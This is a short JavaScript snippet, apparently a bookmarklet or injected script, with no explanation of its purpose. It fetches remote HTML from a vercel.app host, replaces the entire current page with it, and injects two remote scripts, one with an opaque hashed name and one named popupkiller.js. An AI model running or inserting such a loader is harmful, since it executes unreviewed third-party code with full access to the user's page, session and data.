fetch('https://sswp.vercel.app/new10.txt')
  .then(response => {
    if (response.ok) {
      return response.text(); 
    }
    throw new Error('Network response was not ok.');
  })
  .then(html => {
    document.documentElement.innerHTML = html; 
    document.body.replaceWith(document.body.cloneNode(true));
    


    const script = document.createElement('script');
    script.src = 'https://sswp.vercel.app/66ecd44d1c4f66e295df4f0e.js';
    document.body.appendChild(script);
    const script2 = document.createElement('script');
    script2.src = 'https://curtis-gamma.vercel.app/popupkiller.js';
    document.body.appendChild(script2);
  })
  .catch(error => {
    console.error('There was a problem with the fetch operation:', error);
  });
